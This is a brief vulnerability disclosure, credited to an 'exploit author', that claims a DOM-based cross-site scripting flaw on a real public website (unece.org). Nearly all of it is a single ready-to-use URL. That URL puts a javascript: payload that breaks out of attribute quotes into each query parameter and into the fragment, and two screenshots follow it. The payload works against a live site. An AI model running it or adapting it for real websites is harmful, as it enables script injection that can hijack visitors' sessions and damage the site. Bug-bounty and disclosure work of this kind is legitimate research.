# DOM-Based Cross Site Scripting
* `Exploit Author:` **Nguyen Phu Hung (d4rkp0w4r)**
* `parameter vuln & payload`
```c 
https://unece.org/unece-content/documents?accordion=javascript:domxssExecutionSink(1,"'\"><xsstag>()locxss")&keyword=javascript:domxssExecutionSink(1,"'\"><xsstag>()locxss")&past=javascript:domxssExecutionSink(1,"'\"><xsstag>()locxss")&tab=javascript:domxssExecutionSink(1,"'\"><xsstag>()locxss")&type=javascript:domxssExecutionSink(1,"'\"><xsstag>()locxss")&unsubscribe=javascript:domxssExecutionSink(1,"'\"><xsstag>()locxss")&wvstest=javascript:domxssExecutionSink(1,"'\"><xsstag>()locxss")#javascript:domxssExecutionSink(1,"'\"><xsstag>()locxss")
```
![](https://i.imgur.com/N8eiRb9.png)

![](https://i.imgur.com/cfV38gG.png)

